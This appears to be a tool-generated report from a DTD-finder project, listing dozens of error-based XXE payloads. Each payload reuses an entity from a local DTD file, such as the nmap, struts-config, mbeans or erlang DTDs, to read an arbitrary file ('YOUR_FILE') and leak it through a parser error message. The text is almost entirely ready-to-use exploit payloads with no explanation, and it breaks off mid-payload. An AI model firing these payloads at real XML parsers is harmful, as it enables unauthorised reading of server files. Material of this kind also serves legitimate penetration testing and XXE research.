**Injectable entity:** `TypeName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd">

    <!ENTITY % TypeName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd`

**Injectable entity:** `BeanName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd">

    <!ENTITY % BeanName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd`

**Injectable entity:** `Content`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd">

    <!ENTITY % Content '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd`

**Injectable entity:** `Length`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd">

    <!ENTITY % Length '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd`

**Injectable entity:** `Pixels`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd">

    <!ENTITY % Pixels '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd`

**Injectable entity:** `Bool`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd">

    <!ENTITY % Bool '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd`

**Injectable entity:** `ImgAlign`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd">

    <!ENTITY % ImgAlign '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd`

**Injectable entity:** `Body`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/jspxml.dtd">

    <!ENTITY % Body '(aa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd`

**Injectable entity:** `attr_numeric`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd">

    <!ENTITY % attr_numeric '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd`

**Injectable entity:** `attr_ipaddr`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd">

    <!ENTITY % attr_ipaddr '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd`

**Injectable entity:** `attr_percent`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd">

    <!ENTITY % attr_percent '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd`

**Injectable entity:** `attr_type`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd">

    <!ENTITY % attr_type '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd`

**Injectable entity:** `host_states`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd">

    <!ENTITY % host_states '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd`

**Injectable entity:** `port_states`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd">

    <!ENTITY % port_states '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd`

**Injectable entity:** `hostname_types`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd">

    <!ENTITY % hostname_types '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd`

**Injectable entity:** `scan_types`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd">

    <!ENTITY % scan_types '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd`

**Injectable entity:** `port_protocols`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd">

    <!ENTITY % port_protocols '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd`

**Injectable entity:** `service_confs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/nmap/nmap.dtd">

    <!ENTITY % service_confs '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/mbeans-descriptors.dtd`

**Injectable entity:** `Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/mbeans-descriptors.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/mbeans-descriptors.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/mbeans-descriptors.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/mbeans-descriptors.dtd`

**Injectable entity:** `MethodName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/mbeans-descriptors.dtd">

    <!ENTITY % MethodName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/mbeans-descriptors.dtd`

**Injectable entity:** `VariableName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/mbeans-descriptors.dtd">

    <!ENTITY % VariableName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/erlang/application.dtd`

**Injectable entity:** `common`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/erlang/application.dtd">

    <!ENTITY % common '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/erlang/common.dtd`

**Injectable entity:** `common.entities`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/erlang/common.dtd">

    <!ENTITY % common.entities '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/erlang/common.entities.dtd`

**Injectable entity:** `ISOlat1`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/erlang/common.entities.dtd">

    <!ENTITY % ISOlat1 '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/erlang/xhtml1-strict.dtd`

**Injectable entity:** `HTMLlat1`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/erlang/xhtml1-strict.dtd">

    <!ENTITY % HTMLlat1 '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/dblatex-config.dtd`

**Injectable entity:** `attlist.modname`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/dblatex-config.dtd">

    <!ENTITY % attlist.modname '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/dblatex-config.dtd`

**Injectable entity:** `attlist.filepath`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/dblatex-config.dtd">

    <!ENTITY % attlist.filepath '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/dblatex-config.dtd`

**Injectable entity:** `attlist.mod_or_file`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/dblatex-config.dtd">

    <!ENTITY % attlist.mod_or_file '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd`

**Injectable entity:** `AttributeName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd">

    <!ENTITY % AttributeName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd`

**Injectable entity:** `BeanName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd">

    <!ENTITY % BeanName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd`

**Injectable entity:** `Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd`

**Injectable entity:** `Integer`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd">

    <!ENTITY % Integer '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd`

**Injectable entity:** `Location`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd">

    <!ENTITY % Location 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd`

**Injectable entity:** `PropName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd">

    <!ENTITY % PropName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd`

**Injectable entity:** `RequestPath`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd">

    <!ENTITY % RequestPath '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd`

**Injectable entity:** `RequestScope`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_3.dtd">

    <!ENTITY % RequestScope '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd`

**Injectable entity:** `AttributeName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd">

    <!ENTITY % AttributeName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd`

**Injectable entity:** `BeanName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd">

    <!ENTITY % BeanName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd`

**Injectable entity:** `Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
